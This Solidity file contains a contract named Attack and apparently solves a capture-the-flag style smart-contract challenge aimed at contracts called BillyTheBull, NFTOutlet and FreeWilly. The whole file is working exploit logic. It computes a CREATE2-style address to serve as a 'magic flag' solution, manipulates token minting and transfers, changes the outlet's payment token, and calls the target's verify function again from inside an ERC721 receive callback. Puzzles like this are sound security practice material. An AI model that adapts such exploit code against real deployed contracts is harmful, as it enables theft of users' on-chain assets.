pragma solidity ^0.8.0;

import { IFreeWilly } from "./interfaces/IFreeWilly.sol";
import { IERC721    } from "./interfaces/IERC721.sol";
import { BillyTheBull } from "./BillyTheBull.sol";
import { NFTOutlet } from "./NFTOutlet.sol";
import { CreationCodeProvider } from "./CreationCodeProvider.sol";


contract Attack {

  IERC721 constant rippedJesus = IERC721(0xe5220446640A68693761e6e7429965D82db4c474);
  address constant billyTheBullOwner = 0x584258D4D63e116216EB74BA328e03486B3B3870;

  uint256 immutable tokenId1;
  uint256 immutable tokenId2;

  address immutable owner;
  CreationCodeProvider immutable creationCodeProvider;

  BillyTheBull immutable billyTheBull;
  IFreeWilly immutable freeWilly = IFreeWilly(0xe5608a36489Fe45a8f08fD0c6B028801cE6B38d1);

  address toOverwrite;


  constructor(address _billyTheBull, address _creationCodeProvider) {
    owner = msg.sender;
    billyTheBull = BillyTheBull(_billyTheBull);
    creationCodeProvider = CreationCodeProvider(_creationCodeProvider);
    freeWilly.setApprovalForAll(address(billyTheBull.nftOutlet()), true);
    uint256 start = billyTheBull.generate(owner);
    tokenId1 = start >> 128;
    tokenId2 = uint(uint128(start));
  }

  function getMagicFlag() external returns (bytes memory) {

    freeWilly.mint(billyTheBull.nftPrice());
    freeWilly.transferFrom(address(this), attackAddress(), billyTheBull.nftPrice());

    if (rippedJesus.balanceOf(attackAddress()) == 0 ) {
      toOverwrite = address(this);
      billyTheBull.nftOutlet().changePaymentToken(address(freeWilly));
      toOverwrite = billyTheBullOwner;
      return _justGetMagicFlag();
    } else {
      return abi.encode(keccak256(abi.encode(uint256(666)))); // just return some random magic flag this time
    }
  }

  function _justGetMagicFlag() internal view returns (bytes memory) {
    return abi.encodePacked(bytes1(0xff), owner, bytes32(0), keccak256(abi.encodePacked(creationCodeProvider.getAttackCreationCode(), abi.encode(address(billyTheBull), address(creationCodeProvider)))));
  }

  function justGetMagicFlag() external view returns (bytes memory) {
    return _justGetMagicFlag();
  }

  function attackAddress() internal view returns (address) {
    return address(uint160(_solution()));
  }

  function _solution() internal view returns (uint256) {
    return uint256(keccak256(_justGetMagicFlag()));
  }

  function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {

       if (rippedJesus.balanceOf(attackAddress()) != 2) {
           billyTheBull.verify(tokenId2 + (tokenId2 << 128), _solution());
       }

      return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
  }


}